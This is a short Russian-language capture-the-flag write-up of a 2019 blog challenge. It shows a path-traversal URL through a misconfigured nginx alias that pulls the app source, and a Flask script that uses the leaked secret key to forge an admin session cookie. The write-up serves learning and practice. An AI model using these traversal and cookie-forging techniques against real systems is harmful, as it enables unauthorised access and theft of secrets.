При помощи dirsearch нашли локейшен /login , попробовали поискать блайнд sql инъекцию - не помогло.
Обратили внимание на подсказку "Blog was copromised, messed out with nginx configuration :-(" - значит можно вытянуть исходники.
Погуглили на тему "nginx misconfiguration vulnurability", https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/.
Из искодников главной увидели ссылку на статику.
http://blog.ctf2019.rocks/static../app.py получили secret_key для куки и увидели что авторизация идет через sqlite базенку. Скачали базенку из таблицы secret вытнянули первый доп.
Вторая подсказка на главной про app2.py, http://blog.ctf2019.rocks/static../app2.py - второй доп.

```python
from flask import Flask, session
app = Flask(__name__)

app.secret_key = "vei9sheithie7eey4yaeChaesh1po0EecheMugh5phee8Cheivohy1ooNailnjnjnjnjn"

@app.route('/')
def index():
    session['username'] = 'admin'
    session['domain'] = 'blog.ctf2019.rocks'
    return "check session"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, threaded=True)
```

C новой кукой дернули гавную блога и получили основной флаг.
